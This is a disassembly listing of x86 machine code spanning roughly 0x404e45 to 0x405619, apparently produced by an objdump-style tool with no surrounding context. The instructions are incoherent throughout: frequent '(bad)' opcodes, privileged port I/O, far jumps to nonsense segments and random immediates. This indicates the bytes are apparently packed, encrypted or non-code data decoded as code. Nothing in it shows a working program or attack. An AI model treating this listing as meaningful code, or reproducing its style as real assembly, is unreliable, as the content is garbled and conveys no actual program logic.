  404e45:	popa   
  404e46:	dec    eax
  404e47:	fcmovu st,st(5)
  404e49:	xor    edx,DWORD PTR [eax-0x72]
  404e4c:	mov    DWORD PTR [ecx],edi
  404e4e:	(bad)  
  404e4f:	int3   
  404e50:	add    DWORD PTR [edx-0x54],ebx
  404e53:	loope  0x404e1e
  404e55:	xor    al,0x51
  404e57:	adc    cl,BYTE PTR [eax+0x673efc51]
  404e5d:	popf   
  404e5e:	dec    ebx
  404e5f:	sub    BYTE PTR fs:[edx+0x59],cl
  404e63:	jb     0x404e8b
  404e65:	outs   dx,DWORD PTR ds:[esi]
  404e66:	push   ds
  404e67:	aaa    
  404e68:	or     eax,0x3cf8b7a1
  404e6d:	arpl   WORD PTR [ebx+0xb697895],bp
  404e73:	adc    BYTE PTR [edx],bl
  404e75:	sub    eax,0x235a495b
  404e7a:	cmp    ebp,0xffffff9a
  404e7d:	pop    ebx
  404e7e:	mov    bl,0xbc
  404e80:	jns    0x404e77
  404e82:	sbb    eax,0x39c2d14c
  404e87:	push   eax
  404e88:	inc    edi
  404e89:	mul    DWORD PTR [ebp+0xa]
  404e8c:	(bad)  
  404e8e:	jmp    0x59da2010
  404e93:	xchg   DWORD PTR [ebx-0xfa4ece0],edi
  404e99:	xchg   DWORD PTR [edx+0x65116e4d],ebp
  404e9f:	xlat   BYTE PTR ds:[ebx]
  404ea0:	out    dx,eax
  404ea1:	int    0x8b
  404ea3:	mov    ds:0x14fe544,eax
  404ea8:	fwait
  404ea9:	mov    edi,ecx
  404eab:	stos   BYTE PTR es:[edi],al
  404eac:	mov    esp,0xef187974
  404eb1:	push   0xfffffff9
  404eb3:	inc    eax
  404eb4:	hlt    
  404eb5:	jnp    0x404e49
  404eb7:	sbb    al,0xfd
  404eb9:	xor    cl,bh
  404ebb:	dec    esp
  404ebc:	pop    edx
  404ebd:	rcl    BYTE PTR ds:0x3842e3a2,0x79
  404ec4:	xchg   ebp,eax
  404ec5:	sub    dh,BYTE PTR [ecx+0xe62d464]
  404ecb:	cmp    eax,0xab5c1464
  404ed0:	jmp    FWORD PTR [edi-0x31]
  404ed3:	fidiv  WORD PTR [ebx]
  404ed5:	stc    
  404ed6:	ret    0x1400
  404ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eda:	loop   0x404ea0
  404edc:	loop   0x404f0b
  404ede:	push   edx
  404edf:	pushf  
  404ee0:	sbb    DWORD PTR [ecx+0x51a9a39e],esp
  404ee6:	aad    0xa9
  404ee8:	push   ebp
  404ee9:	jl     0x404e8e
  404eeb:	xchg   ebx,eax
  404eec:	jmp    0x404f23
  404eee:	call   0xe955fec1
  404ef3:	mov    cl,0xd2
  404ef5:	aas    
  404ef6:	inc    esi
  404ef7:	xchg   DWORD PTR [ecx+0x5e],esp
  404efa:	inc    ecx
  404efb:	mov    ds:0xe3f54ad0,al
  404f00:	js     0x404ed9
  404f02:	rcr    ebp,0x3d
  404f05:	test   eax,0x1df09810
  404f0a:	add    BYTE PTR [ecx],bh
  404f0c:	lods   eax,DWORD PTR ds:[esi]
  404f0d:	mov    edx,0xe75b4a50
  404f12:	clc    
  404f13:	aam    0x71
  404f15:	cmp    eax,DWORD PTR [esi]
  404f17:	sub    eax,0x21850aa
  404f1c:	sub    eax,0xe974638a
  404f21:	and    DWORD PTR [edx-0x596bc1e1],ecx
  404f27:	test   BYTE PTR [esp+ebx*1],cl
  404f2a:	leave  
  404f2b:	add    al,0xd3
  404f2d:	pop    ecx
  404f2e:	mov    eax,0xae22904b
  404f33:	cwde   
  404f34:	sbb    DWORD PTR [esi-0x4456fd9f],ebp
  404f3a:	sti    
  404f3b:	out    dx,al
  404f3c:	dec    eax
  404f3d:	xchg   edi,eax
  404f3e:	lahf   
  404f3f:	jmp    DWORD PTR [ebx+0x2]
  404f42:	cld    
  404f43:	fsubr  DWORD PTR [ebp-0x76ab1fb4]
  404f49:	sbb    ch,BYTE PTR [eax+0x57]
  404f4c:	push   esp
  404f4d:	enter  0xb3a7,0x15
  404f51:	fistp  QWORD PTR [ecx+0x74]
  404f54:	push   esi
  404f55:	(bad)  
  404f56:	rol    BYTE PTR [ecx-0x57],cl
  404f59:	xor    al,0xfd
  404f5b:	fld    DWORD PTR [edx+0x38]
  404f5e:	cmp    BYTE PTR [edx-0x54],cl
  404f61:	and    eax,0x60d8b866
  404f66:	mov    al,ds:0x2089245b
  404f6b:	(bad)  
  404f6c:	cmp    esp,DWORD PTR [ebx-0x78]
  404f6f:	and    dh,al
  404f71:	jbe    0x404f08
  404f73:	pop    ebx
  404f74:	and    eax,DWORD PTR [esi+ebp*2-0x2f109ce9]
  404f7b:	jo     0x404fa7
  404f7d:	mov    edi,0xd563db43
  404f82:	out    dx,eax
  404f83:	addr16 dec ecx
  404f85:	xor    al,0xf0
  404f87:	or     ah,dl
  404f89:	and    al,0xb5
  404f8b:	ins    DWORD PTR es:[edi],dx
  404f8c:	sub    eax,0x19514171
  404f91:	sbb    eax,edi
  404f93:	rcl    DWORD PTR [esi+0x52fb5b5b],cl
  404f99:	jae    0x404fbf
  404f9b:	push   cs
  404f9c:	fstp   DWORD PTR [edi-0x34]
  404f9f:	xor    al,0xe6
  404fa1:	test   eax,0xedfc58b1
  404fa6:	shr    bh,0xbd
  404fa9:	std    
  404faa:	ja     0x404f92
  404fac:	into   
  404fad:	push   0xcd9f38de
  404fb2:	push   esp
  404fb3:	inc    edx
  404fb4:	pushf  
  404fb5:	mov    esp,0x1a98f4a8
  404fba:	test   eax,0x11c1e197
  404fbf:	fchs   
  404fc1:	in     al,dx
  404fc2:	bound  edx,QWORD PTR [ebx+0x52]
  404fc5:	dec    edx
  404fc6:	pusha  
  404fc7:	mov    BYTE PTR [edx-0xb],dh
  404fca:	xor    BYTE PTR [edx-0x3ea35678],dh
  404fd0:	inc    esp
  404fd1:	pushf  
  404fd2:	jp     0x404f94
  404fd4:	sbb    al,0x7f
  404fd6:	jne    0x404f78
  404fd8:	mov    ah,BYTE PTR [ebp-0x4c]
  404fdb:	aad    0xed
  404fdd:	or     DWORD PTR [edi-0x6f9f6570],esp
  404fe3:	aas    
  404fe4:	pop    ebp
  404fe5:	add    al,0x90
  404fe7:	loope  0x404fc2
  404fe9:	jl     0x404fdd
  404feb:	mov    ch,0xb8
  404fed:	js     0x404f9f
  404fef:	adc    BYTE PTR [esi+0x1c3dec3c],bh
  404ff5:	jp     0x40506e
  404ff7:	xchg   ecx,eax
  404ff8:	xchg   BYTE PTR [eax+edx*4-0x69],bh
  404ffc:	and    eax,0x6c58937f
  405001:	jp     0x404f83
  405003:	inc    eax
  405004:	cmp    ebp,DWORD PTR [ebx]
  405006:	push   ecx
  405007:	xor    DWORD PTR [edx],edx
  405009:	mov    eax,0xa93cb8f8
  40500e:	pusha  
  40500f:	out    0xf2,eax
  405011:	push   ss
  405012:	push   esp
  405013:	pop    esp
  405014:	shl    DWORD PTR [edi+0x2f50a6e4],cl
  40501a:	in     al,dx
  40501b:	push   ebp
  40501c:	mov    al,ds:0x503e24b4
  405021:	std    
  405022:	shl    BYTE PTR [esi],1
  405024:	je     0x405029
  405026:	fisttp DWORD PTR [ebx-0x9]
  405029:	sub    bh,bl
  40502b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40502c:	int3   
  40502d:	jg     0x405044
  40502f:	mov    cl,0xb3
  405031:	sbb    al,0x4
  405033:	push   0xffffffd8
  405035:	clc    
  405036:	push   eax
  405037:	mov    eax,ds:0xa447d1a4
  40503c:	into   
  40503d:	xor    DWORD PTR [esi],edx
  40503f:	out    dx,eax
  405040:	test   BYTE PTR [edx-0x6],ch
  405043:	cs (bad) 
  405046:	lahf   
  405047:	cmc    
  405048:	pop    esi
  405049:	in     al,0xd6
  40504b:	jecxz  0x40504f
  40504d:	inc    ebp
  40504e:	out    dx,eax
  40504f:	scas   al,BYTE PTR es:[edi]
  405050:	adc    eax,ecx
  405052:	cmp    dh,bh
  405054:	push   edi
  405055:	call   0x436ceb97
  40505a:	fist   WORD PTR [esi+esi*2+0x4f40e306]
  405061:	sbb    eax,0x9e6e4a98
  405066:	ds and al,0xd5
  405069:	cld    
  40506a:	sub    cl,BYTE PTR [eax]
  40506c:	cmp    DWORD PTR [esi-0x49],ebp
  40506f:	push   edx
  405070:	clc    
  405071:	xchg   edx,eax
  405072:	test   eax,0xfaf1f51a
  405077:	jmp    0x369d:0x4df55dbe
  40507e:	cmp    eax,0xe20acd59
  405083:	mov    bl,BYTE PTR [esi+0x39]
  405086:	push   edi
  405087:	adc    ebp,esi
  405089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40508a:	repnz push ss
  40508c:	fld    DWORD PTR [esi-0x4d]
  40508f:	cmp    eax,0xd0e23a32
  405094:	mov    al,ds:0x222c401b
  405099:	dec    ecx
  40509a:	dec    esp
  40509b:	pop    edx
  40509c:	inc    esp
  40509d:	add    BYTE PTR cs:[esi*1-0x41204597],dh
  4050a5:	or     ch,cl
  4050a7:	dec    edi
  4050a8:	sub    al,0x48
  4050aa:	push   0xffffffb7
  4050ac:	sbb    DWORD PTR [ebx],edi
  4050ae:	dec    ecx
  4050af:	jmp    0x2be41349
  4050b4:	inc    esp
  4050b5:	mov    edx,0x8ab6e394
  4050ba:	jp     0x4050d5
  4050bc:	xor    al,0xf6
  4050be:	and    al,0x8d
  4050c0:	jg     0x405050
  4050c2:	mov    DWORD PTR [ebp-0x31],edx
  4050c5:	ret    
  4050c6:	ss xor ax,0x9791
  4050cb:	ret    
  4050cc:	popf   
  4050cd:	icebp  
  4050ce:	or     BYTE PTR [ebx+0x4bb87346],bh
  4050d4:	bound  ebx,QWORD PTR [ebx+0x2d]
  4050d7:	xchg   edi,eax
  4050d8:	(bad)  
  4050d9:	jg     0x4050b9
  4050db:	jo     0x4050e5
  4050dd:	push   esp
  4050de:	xchg   esp,eax
  4050df:	xchg   esp,eax
  4050e0:	xor    BYTE PTR [edx-0x33],bl
  4050e3:	xchg   BYTE PTR [eax-0x18f67274],dl
  4050e9:	mov    bl,BYTE PTR [esi+0x48]
  4050ec:	or     ecx,DWORD PTR [esi+0x13fc5833]
  4050f2:	mov    esi,fs
  4050f4:	dec    eax
  4050f5:	outs   dx,BYTE PTR ds:[esi]
  4050f6:	test   eax,0x86c79463
  4050fb:	inc    edi
  4050fc:	out    dx,eax
  4050fd:	add    DWORD PTR [esi+0x7a],edx
  405100:	jecxz  0x40516c
  405102:	mov    dh,BYTE PTR [eax+0x2fc2ff09]
  405108:	mov    ah,0x5c
  40510a:	mov    bh,0x64
  40510c:	mov    esp,0x1434d857
  405111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405112:	daa    
  405113:	dec    eax
  405114:	mov    dl,BYTE PTR [esi]
  405116:	leave  
  405117:	pop    ss
  405118:	pop    eax
  405119:	hlt    
  40511a:	repz scas eax,DWORD PTR es:[edi]
  40511c:	std    
  40511d:	xor    ah,0x84
  405120:	mov    ds:0xd95bae03,eax
  405125:	shl    DWORD PTR [ecx+0x7e],cl
  405128:	push   es
  405129:	int    0x7f
  40512b:	shl    DWORD PTR [ecx],cl
  40512d:	inc    BYTE PTR [eax]
  40512f:	popf   
  405130:	inc    eax
  405131:	imul   esp,DWORD PTR [edi-0x67],0x29
  405135:	test   al,0x9e
  405137:	sar    DWORD PTR gs:[edx],cl
  40513a:	mov    WORD PTR [ecx],ss
  40513c:	fdivrp st(7),st
  40513e:	or     BYTE PTR [ecx-0x34],ch
  405141:	or     eax,0x8f4e892c
  405146:	pop    esp
  405147:	in     eax,dx
  405148:	out    dx,al
  405149:	in     eax,0x5b
  40514b:	xchg   DWORD PTR [edx+edi*8-0x11],esi
  40514f:	add    bl,BYTE PTR [eax+0x3a]
  405152:	addr16 and ecx,0x3e50d44e
  405159:	sbb    al,ch
  40515b:	sbb    al,0xb4
  40515d:	dec    ebp
  40515e:	loopne 0x405165
  405160:	stos   DWORD PTR es:[edi],eax
  405161:	call   FWORD PTR [eax-0x4e]
  405164:	jmp    0x40516f
  405166:	push   eax
  405167:	mov    esi,0x42651c86
  40516c:	int    0x3a
  40516e:	cwde   
  40516f:	sar    BYTE PTR ds:0x9320d7c7,1
  405175:	loope  0x4051b9
  405177:	out    dx,al
  405178:	ret    
  405179:	imul   ecx,DWORD PTR [eax],0x5d
  40517c:	jo     0x405168
  40517e:	ja     0x405138
  405180:	mov    DWORD PTR [edx+0x78],eax
  405183:	or     BYTE PTR [ecx+eiz*4+0x763d8c0b],0x77
  40518b:	pop    es
  40518c:	add    eax,0xac208c1c
  405191:	ror    BYTE PTR [ebx],1
  405193:	or     edx,DWORD PTR es:[ebx]
  405196:	sbb    bh,al
  405198:	inc    eax
  405199:	std    
  40519a:	pop    esp
  40519b:	inc    edx
  40519c:	mov    ecx,0xb2aa73b
  4051a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051a2:	sbb    BYTE PTR [ecx-0x6b],bl
  4051a5:	adc    bl,BYTE PTR [ebx+0x51]
  4051a8:	pop    eax
  4051a9:	repz mov dl,0x79
  4051ac:	jge    0x40516d
  4051ae:	js     0x40514a
  4051b0:	fs xchg edx,eax
  4051b2:	fidivr WORD PTR [ecx-0x6e158307]
  4051b8:	scas   al,BYTE PTR es:[edi]
  4051b9:	(bad)  
  4051ba:	cmp    ebp,DWORD PTR [edi]
  4051bc:	outs   dx,BYTE PTR ds:[esi]
  4051bd:	jbe    0x40517c
  4051bf:	jae    0x4051b4
  4051c1:	icebp  
  4051c2:	aaa    
  4051c3:	push   ecx
  4051c4:	cli    
  4051c5:	push   es
  4051c6:	pop    eax
  4051c7:	lds    ebp,FWORD PTR [ecx-0x3d]
  4051ca:	push   edx
  4051cb:	loop   0x40514e
  4051cd:	loop   0x40519c
  4051cf:	pop    edi
  4051d0:	shl    DWORD PTR [esi],1
  4051d2:	out    0x79,al
  4051d4:	pop    ebx
  4051d5:	fisubr WORD PTR [edi]
  4051d7:	jecxz  0x4051b5
  4051d9:	loope  0x405218
  4051db:	mov    ds:0x5c9ddf95,al
  4051e0:	out    dx,al
  4051e1:	mov    ds:0xb1e8286,eax
  4051e6:	jp     0x405199
  4051e8:	mov    ah,0xa2
  4051ea:	pop    ebx
  4051eb:	push   cs
  4051ec:	fnsave [esi+0x4f77a30b]
  4051f2:	ins    BYTE PTR es:[edi],dx
  4051f3:	leave  
  4051f4:	pop    ebx
  4051f5:	pusha  
  4051f6:	or     eax,0xffffffad
  4051f9:	adc    eax,0x343b4d76
  4051fe:	ds ret 0xcb76
  405202:	stc    
  405203:	out    dx,al
  405204:	paddd  mm3,QWORD PTR [esp+ecx*4-0x18]
  405209:	outs   dx,BYTE PTR ds:[esi]
  40520a:	push   es
  40520b:	cmp    eax,0x4caa5977
  405210:	sbb    ch,BYTE PTR [edx-0x7ec7383f]
  405216:	jp     0x4051b6
  405218:	je     0x405295
  40521a:	stc    
  40521b:	lahf   
  40521c:	or     bl,ah
  40521e:	and    BYTE PTR [eax+edi*4-0x6e8851d],cl
  405225:	int    0x72
  405227:	rcl    DWORD PTR [eax+0x5d0d615b],1
  40522d:	add    eax,edx
  40522f:	dec    edi
  405230:	adc    ecx,DWORD PTR [eax-0x5682d31f]
  405236:	repz je 0x405233
  405239:	rol    DWORD PTR [edi],0x83
  40523c:	pushf  
  40523d:	mov    esi,0x60e706b6
  405242:	rcl    DWORD PTR [edi-0x375c991c],cl
  405248:	idiv   DWORD PTR [edi]
  40524a:	mov    ebx,0x940665eb
  40524f:	sahf   
  405250:	dec    ebx
  405251:	pushf  
  405252:	retf   0x5c75
  405255:	fs pop edi
  405257:	pop    eax
  405258:	out    dx,eax
  405259:	push   edx
  40525a:	jno    0x40524a
  40525c:	popa   
  40525d:	inc    ebp
  40525e:	ficomp DWORD PTR [edi+esi*8+0x14]
  405262:	scas   eax,DWORD PTR es:[edi]
  405263:	cld    
  405264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405265:	mov    al,0x26
  405267:	dec    edi
  405268:	popa   
  405269:	in     al,0x8a
  40526b:	mov    al,0xd5
  40526d:	pop    ebp
  40526e:	ins    BYTE PTR es:[edi],dx
  40526f:	jmp    0x40521d
  405271:	loopne 0x405297
  405273:	leave  
  405274:	call   0x6486e094
  405279:	fnstsw WORD PTR [ebx+0x28]
  40527c:	adc    BYTE PTR [ebp+0x481fbc68],ah
  405282:	inc    esi
  405283:	psubd  mm5,mm6
  405286:	mov    eax,ds:0xef1b996e
  40528b:	push   cs
  40528c:	inc    ebx
  40528d:	jbe    0x4052cd
  40528f:	push   cs
  405290:	repnz test DWORD PTR es:[ebx-0x25],esi
  405295:	sub    eax,DWORD PTR [ebp+0x2c524245]
  40529b:	add    eax,0xa2b4bace
  4052a0:	jns    0x40522a
  4052a2:	inc    esp
  4052a3:	lods   eax,DWORD PTR ds:[esi]
  4052a4:	adc    ax,0x85f7
  4052a8:	mov    bh,0x12
  4052aa:	aas    
  4052ab:	ror    BYTE PTR [ebx-0x2b],1
  4052ae:	sbb    bh,bl
  4052b0:	jle    0x4052c6
  4052b2:	push   0xd
  4052b4:	push   edx
  4052b5:	mov    WORD PTR [ebp+0xf],es
  4052b8:	dec    edx
  4052b9:	ret    0x9e7a
  4052bc:	jp     0x4052be
  4052be:	dec    edi
  4052bf:	pop    edi
  4052c0:	jmp    0x40532d
  4052c2:	mov    ds:0x59941b4b,al
  4052c7:	imul   edx,DWORD PTR [edi-0x62],0x59ffca6f
  4052ce:	je     0x405279
  4052d0:	jo     0x4052d7
  4052d2:	mov    ebx,0xbb763e32
  4052d7:	inc    eax
  4052d8:	div    BYTE PTR [edi+0x30c2cb82]
  4052de:	jno    0x405310
  4052e0:	sahf   
  4052e1:	call   0x1704:0x22ef6290
  4052e8:	es push cs
  4052ea:	(bad)  
  4052eb:	dec    eax
  4052ec:	retf   0x6a37
  4052ef:	inc    ebp
  4052f0:	sub    eax,0x3a3f8885
  4052f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052f6:	test   DWORD PTR [esi+ecx*1],ecx
  4052f9:	push   ds
  4052fa:	mov    eax,ds:0xd2a640a6
  4052ff:	mov    ds:0x559f92e9,al
  405304:	dec    ebx
  405305:	pop    edx
  405306:	xchg   esp,eax
  405307:	retf   
  405308:	in     eax,dx
  405309:	pop    ss
  40530a:	add    eax,DWORD PTR [ebx]
  40530c:	add    edi,ebp
  40530e:	popf   
  40530f:	push   esi
  405310:	popf   
  405311:	or     ah,BYTE PTR gs:[edi-0xdca7844]
  405318:	or     ch,0xbf
  40531b:	jg     0x40536f
  40531d:	in     eax,dx
  40531e:	pop    ecx
  40531f:	dec    esi
  405320:	bound  ebx,QWORD PTR [edx]
  405322:	mov    BYTE PTR [ebx],0xde
  405325:	xchg   edx,eax
  405326:	jmp    0x6ee:0x4a03c806
  40532d:	loopne 0x40533d
  40532f:	dec    ebx
  405330:	or     eax,0xdece434a
  405335:	or     BYTE PTR [eax],al
  405337:	and    edi,esp
  405339:	pop    edi
  40533a:	test   al,0x70
  40533c:	mov    edi,0xde1a0d05
  405341:	jmp    0x405375
  405343:	adc    DWORD PTR [esi+0x744401e],esi
  405349:	jns    0x4053b8
  40534b:	xor    edx,ebp
  40534d:	mov    esp,0xf49cef3d
  405352:	add    ecx,0xf2db8e09
  405358:	push   esi
  405359:	(bad)  
  40535a:	imul   eax,eax
  40535d:	out    0x10,al
  40535f:	retf   
  405360:	sbb    bl,BYTE PTR ds:0xaefec2d5
  405366:	xor    edx,ebx
  405368:	or     DWORD PTR [edx-0x75],esi
  40536b:	or     al,0x1f
  40536d:	rol    BYTE PTR [edx],1
  40536f:	pop    edx
  405370:	inc    edx
  405371:	dec    ebp
  405372:	ret    
  405373:	div    dl
  405375:	mov    BYTE PTR [ebp+0x5d],bl
  405378:	xchg   BYTE PTR [ebp-0x48],dl
  40537b:	cld    
  40537c:	retf   0x4e79
  40537f:	in     eax,dx
  405380:	in     eax,dx
  405381:	ds int 0xa2
  405384:	inc    esi
  405385:	dec    ecx
  405386:	mov    BYTE PTR [edi],0xc0
  405389:	add    esi,eax
  40538b:	push   0x8b17f12c
  405390:	out    dx,eax
  405391:	scas   eax,DWORD PTR es:[edi]
  405392:	ins    BYTE PTR es:[edi],dx
  405393:	inc    esi
  405394:	je     0x405408
  405396:	sub    al,0x72
  405398:	sub    al,dh
  40539a:	jmp    0x5390:0x42af7f23
  4053a1:	dec    esp
  4053a2:	mov    bh,0x16
  4053a4:	jp     0x4053bc
  4053a6:	mov    dh,0x23
  4053a8:	in     eax,dx
  4053a9:	mov    bh,0x30
  4053ab:	ficom  DWORD PTR [edi+eax*1]
  4053ae:	sbb    al,0xf8
  4053b0:	lahf   
  4053b1:	or     ecx,edi
  4053b3:	sahf   
  4053b4:	mov    DWORD PTR [ebx+0x41],0xeed698a2
  4053bb:	inc    ebp
  4053bc:	(bad)  
  4053be:	mov    BYTE PTR [ebp+edx*8-0x129c05ce],dh
  4053c5:	sar    dl,1
  4053c7:	mov    eax,0xc668793b
  4053cc:	out    dx,eax
  4053cd:	out    dx,eax
  4053ce:	mov    dl,0x1b
  4053d0:	pusha  
  4053d1:	cmp    DWORD PTR [eax+0x77],ebx
  4053d4:	push   ecx
  4053d5:	inc    ebx
  4053d6:	retf   0xd040
  4053d9:	repz in al,dx
  4053db:	mov    DWORD PTR [eax+0x9017d63],esi
  4053e1:	scas   eax,DWORD PTR es:[edi]
  4053e2:	lods   al,BYTE PTR ds:[esi]
  4053e3:	fsub   DWORD PTR [edi+ebp*8-0xf]
  4053e7:	sbb    edi,edx
  4053e9:	jp     0x405424
  4053eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ec:	cmp    edi,esi
  4053ee:	call   0x49cc:0x59aeeb75
  4053f5:	add    DWORD PTR [ecx-0x77560a8f],ecx
  4053fb:	add    eax,0x7060df96
  405400:	shl    DWORD PTR [edi-0x19dd9d7],1
  405406:	in     eax,dx
  405407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405408:	mov    al,ds:0x8e87ad47
  40540d:	xor    cl,al
  40540f:	pop    eax
  405410:	mov    dh,0x69
  405412:	mov    esp,DWORD PTR [ebp+0x34]
  405415:	jmp    0xa1cacc40
  40541a:	cmc    
  40541b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40541c:	dec    ebp
  40541d:	xchg   esi,eax
  40541e:	ins    BYTE PTR es:[edi],dx
  40541f:	add    DWORD PTR [ecx+ecx*1+0x599bb82d],esi
  405426:	retf   
  405427:	mov    bh,0xda
  405429:	mov    ds:0xf01f9e43,eax
  40542e:	inc    esp
  40542f:	ds (bad) 
  405431:	rol    BYTE PTR [eax-0x2da863],cl
  405437:	nop
  405438:	mov    dl,0xa1
  40543a:	mov    dl,0x76
  40543c:	jl     0x40541d
  40543e:	push   edx
  40543f:	nop
  405440:	mov    ebp,0x8849c4a0
  405445:	xchg   edi,eax
  405446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405447:	dec    esp
  405448:	push   0xa718273f
  40544d:	jmp    0x405409
  40544f:	inc    ecx
  405450:	jo     0x4054c2
  405452:	fist   DWORD PTR [esi+0x48]
  405455:	xor    eax,0xfa48f52b
  40545a:	pop    ecx
  40545b:	mov    bh,0x7
  40545d:	in     al,dx
  40545e:	leave  
  40545f:	and    al,0x5d
  405461:	mov    eax,ds:0x51ccdad3
  405466:	fwait
  405467:	add    eax,0x257107dd
  40546c:	jnp    0x405497
  40546e:	addr16 xchg ebp,eax
  405470:	hlt    
  405471:	mov    ecx,0x7a0bbbc0
  405476:	mov    DWORD PTR [edx],ebx
  405478:	mov    es,WORD PTR [esi]
  40547a:	xor    al,0xbf
  40547c:	aad    0x71
  40547e:	test   BYTE PTR [ebx+edi*2+0x41],0xa4
  405483:	and    al,0x4c
  405485:	scas   al,BYTE PTR es:[edi]
  405486:	test   DWORD PTR [edi],ebp
  405488:	add    dl,ah
  40548a:	cmp    BYTE PTR [ebp-0x63],dh
  40548d:	in     al,0x26
  40548f:	jmp    0x3106111b
  405494:	mov    edx,0xc024a956
  405499:	in     al,0xd2
  40549b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40549c:	mov    BYTE PTR [ebx+edi*2+0x31a8ab56],ah
  4054a3:	mov    al,0xbb
  4054a5:	(bad)  
  4054a6:	xchg   edi,eax
  4054a7:	das    
  4054a8:	inc    ebp
  4054a9:	sbb    eax,0x8c9c5bea
  4054ae:	in     eax,0x7b
  4054b0:	mov    bl,0xf5
  4054b2:	data16 mov WORD PTR [eax],ds
  4054b5:	or     eax,0xd3d46c38
  4054ba:	xchg   bh,dh
  4054bc:	jmp    0x405537
  4054be:	repz and DWORD PTR [ebp+0x5a],0xffffffab
  4054c3:	sub    BYTE PTR [eax+0x25e36192],dh
  4054c9:	xchg   ecx,eax
  4054ca:	jmp    0x693:0x75af50d9
  4054d1:	data16 fsubrp st(6),st
  4054d4:	rcl    BYTE PTR [bx+di],1
  4054d7:	xchg   esi,eax
  4054d8:	hlt    
  4054d9:	mov    eax,ds:0x742e2b9b
  4054de:	lods   al,BYTE PTR ds:[esi]
  4054df:	push   es
  4054e0:	mov    BYTE PTR [esi+0x2a],cl
  4054e3:	jl     0x4054c5
  4054e5:	mov    eax,ds:0x1eb9d825
  4054ea:	inc    edx
  4054eb:	pop    esi
  4054ec:	es push ebp
  4054ee:	shl    ah,0x7f
  4054f1:	repz sbb eax,0xba089b22
  4054f7:	mov    ds:0xfcbdf3ca,eax
  4054fc:	jmp    0x520137a2
  405501:	scas   al,BYTE PTR es:[edi]
  405502:	imul   ecx,DWORD PTR [edx+esi*4],0x1fedfff6
  405509:	sub    eax,edi
  40550b:	arpl   WORD PTR [ecx+0x6c],di
  40550e:	(bad)  
  40550f:	mov    esi,0x3636a198
  405514:	imul   ebp,DWORD PTR [edx+0x27310d02],0xffffffaf
  40551b:	dec    esp
  40551c:	pusha  
  40551d:	xor    DWORD PTR [ecx],edi
  40551f:	jecxz  0x40550f
  405521:	imul   ecx,eax,0xfffffff8
  405524:	add    al,0x8e
  405526:	cld    
  405527:	dec    ebx
  405528:	inc    ecx
  405529:	sub    edx,ebp
  40552b:	imul   BYTE PTR [edx+0x24]
  40552e:	cmp    al,0x1b
  405530:	ins    BYTE PTR es:[edi],dx
  405531:	repz jg 0x405510
  405534:	or     ch,ah
  405536:	push   ss
  405537:	scas   eax,DWORD PTR es:[edi]
  405538:	mov    ds:0xec1bce6c,eax
  40553d:	gs push cs
  40553f:	test   bh,ah
  405541:	mov    ah,0x5b
  405543:	or     bl,dl
  405545:	mov    al,0x98
  405547:	popa   
  405548:	retf   
  405549:	and    al,0x74
  40554b:	and    BYTE PTR [ebp+esi*8-0x50b7836d],0xf4
  405553:	in     eax,dx
  405554:	jnp    0x4055bf
  405556:	mov    edx,0x38c5469a
  40555b:	gs daa 
  40555d:	mov    ah,0x9e
  40555f:	int    0xf1
  405561:	out    dx,eax
  405562:	push   esp
  405563:	sti    
  405564:	mov    edi,0x9053ad4f
  405569:	or     BYTE PTR [esp+ebx*2-0x48d1f3ee],cl
  405570:	sbb    al,0x84
  405572:	in     eax,dx
  405573:	lods   eax,DWORD PTR ds:[esi]
  405574:	(bad)  
  405575:	dec    BYTE PTR [ebx]
  405577:	and    bl,dl
  405579:	add    BYTE PTR [eax+0x22],dl
  40557c:	pop    esp
  40557d:	pop    es
  40557e:	cwde   
  40557f:	push   es
  405580:	ret    0x7fed
  405583:	stos   BYTE PTR es:[edi],al
  405584:	dec    edx
  405585:	les    edx,FWORD PTR [ebp+0x2f]
  405588:	cmp    eax,0x8daad890
  40558d:	fcom   DWORD PTR [edx+0x3e]
  405590:	xor    BYTE PTR [edi-0x3],0xe6
  405594:	popf   
  405595:	icebp  
  405596:	mov    edx,0x8d322aba
  40559b:	and    al,0xd1
  40559d:	fstp   TBYTE PTR [eax-0x19632428]
  4055a3:	stos   BYTE PTR es:[edi],al
  4055a4:	call   0x2c2ce8c
  4055a9:	or     eax,0xd3255500
  4055ae:	pop    ss
  4055af:	psadbw mm2,QWORD PTR [esi]
  4055b2:	mov    dh,0x2e
  4055b4:	popa   
  4055b5:	mov    BYTE PTR [edx],bh
  4055b7:	mov    es,WORD PTR [ecx+esi*2+0x63]
  4055bb:	sbb    BYTE PTR [ebx+0x73ac51c],ch
  4055c1:	jl     0x4055a9
  4055c3:	rcl    BYTE PTR [eax],cl
  4055c5:	fiadd  WORD PTR [eax+ebx*4]
  4055c8:	cmp    eax,0x1a4ee6da
  4055cd:	fwait
  4055ce:	sub    dh,bl
  4055d0:	or     al,0x8f
  4055d2:	inc    ecx
  4055d3:	push   ss
  4055d4:	sahf   
  4055d5:	test   al,0x52
  4055d7:	xor    DWORD PTR [eax+eax*2],edi
  4055da:	push   DWORD PTR [ecx-0xc055f60]
  4055e0:	mov    bl,0xef
  4055e2:	and    dl,bl
  4055e4:	xor    BYTE PTR [edi],0xb7
  4055e7:	pop    esi
  4055e8:	loop   0x4055ce
  4055ea:	push   0x7fc7f1d0
  4055ef:	aam    0x82
  4055f1:	sub    eax,0x34e4c71
  4055f6:	mov    BYTE PTR [eax+edx*8],0xa6
  4055fa:	nop
  4055fb:	xchg   ebx,eax
  4055fc:	push   ebp
  4055fd:	and    dl,ch
  4055ff:	arpl   WORD PTR [eiz*4-0x2a198d97],sp
  405606:	inc    edx
  405607:	rcr    BYTE PTR [ebp+edi*8-0x80],cl
  40560b:	cmp    ebp,ebx
  40560d:	cmp    BYTE PTR [ebp+0x349798dd],0x13
  405614:	xchg   DWORD PTR [edi+0x29],ebp
  405617:	daa    
  405618:	(bad)  
  405619:	shl    edx,cl
